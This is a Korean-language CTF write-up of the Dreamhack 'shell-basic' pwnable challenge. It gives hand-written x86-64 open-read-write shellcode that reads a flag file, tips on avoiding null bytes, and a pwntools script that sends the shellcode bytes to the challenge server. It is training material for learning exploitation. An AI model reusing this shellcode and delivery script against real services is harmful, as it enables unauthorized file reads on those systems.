---
title: "[pwn]shell-basic"
category: CTF
tags: [pwnable]
excerpt: "dreamhack shell-basic writeup"
toc: true
toc_label: "Table of Contents"
toc_sticky: true
toc_icon: "bars"
---

처음 풀어보는 포너블 문제라 감도 안왔지만 튜토리얼로 어느정도는 따라갈 수 있었다. 파일 경로가 길어졌다는 것을 제외하면 같은 방식이다.
## 환경조사  
  amd64 LE  
## Assembly 작성
  ~~~
__asm__(
	".global main\n"
        "main:\n"

	"xor rax,rax\n"
	"push rax\n"
        "mov rax,0x676E6F6F6F6F6F6F\n"
	"push rax\n"
        "mov rax,0x6C5F73695F656D61\n"
        "push rax\n"
	"mov rax,0x6E5F67616C662F63\n"
        "push rax\n"
	"mov rax,0x697361625F6C6C65\n"
        "push rax\n"
	"mov rax,0x68732F656D6F682F\n"
        "push rax\n"
	"mov rdi,rsp\n"
        "xor rsi,rsi\n"
        "xor rdx,rdx\n"
	"xor rax,rax\n"
	"add rax,0x2\n"
        "syscall\n"
	"\n"
        "mov rdi,rax\n"
	"mov rsi,rsp\n"
	"sub rsi,0x30\n"
        "xor rax,rax\n"
	"xor rdx,rdx\n"
	"add rdx,0x30\n"
        "syscall\n"
	"\n"
	"xor rdi,rdi\n"
	"add rdi,0x1\n"
	"xor rax,rax\n"
	"add rax,0x1\n"
        "syscall");
  ~~~
  먼저 stack에 file location을 string의 형태로 넣었다. 파일 경로가 8byte에 맞아 떨어지므로 \0을 마지막에 넣어주기 위해 0을 먼저 push해주었다.   
  그 이후에는 SYSCALL 함수의 parameter에 따라 변수를 넣어준다. **SYS_OPEN(const char \*filename,int flags,umode_t mode)** 에 flags=0, mode=null 을 넣어준다. **SYS_READ(unsigned int fd,char \*buf,size_t count)**, **SYS_WRITE(unsigned int fd,char \*buf,size_t count)** 함수의 parameter에 맞게 넣어주면 된다.  
  
  shell code에는 \x00이 포함되면 안되므로 **mov rax,0x0** 이 아닌 **xor rax,rax**를 해주어야 한다. **mov rax,0x1**도 마찬가지로 0x1이 64bit size에 맞춰 0x01000000이 된다. 따라서 xor과 add를 통해 입력한다.
  {: .notice--danger}
## OPcode 추출
  **gcc -o orw orw.c -masm=intel** 명령어를 통해 컴파일 후 **objdump -d ./orw** 명령어로 opcode를 추출한다.  
  <img width="605" alt="opcode" src="https://user-images.githubusercontent.com/45323902/154000690-ae589c0c-4fb5-46fa-823f-0cd0e2fd155d.png">  
  이때 마지막 syscall(\x0f\x05)까지만 추출하면 된다.  
## script 작성
  ~~~
	from pwn import *

	p=remote('host1.dreamhack.games',22700)
	p.recvuntil(b'shellcode:')
    exploit=b'\x48\x31\xc0\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x48\x83\xc0\x02\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\x31\xc0\x48\x31\xd2\x48\x83\xc2\x30\x0f\x05\x48\x31\xff\x48\x83\xc7\x01\x48\x31\xc0\x48\x83\xc0\x01\x0f\x05'
	p.send(exploit)
	p.interactive()
  ~~~
  script를 이용해 shellcode를 전달하면 함수 내부에서 shellcode를 메모리에 넣고 실행하게 된다.  
  <img width="725" alt="script exec" src="https://user-images.githubusercontent.com/45323902/154060282-9a3a8081-505a-4e1f-b5fe-d719bde16195.png">  
  이때 flag이후에 다른 값이 나오는 이유는 buf size가 0x30인데 flag가 그보다 짧아 메모리에 있는 다른 내용까지 출력하게 된 것이다.
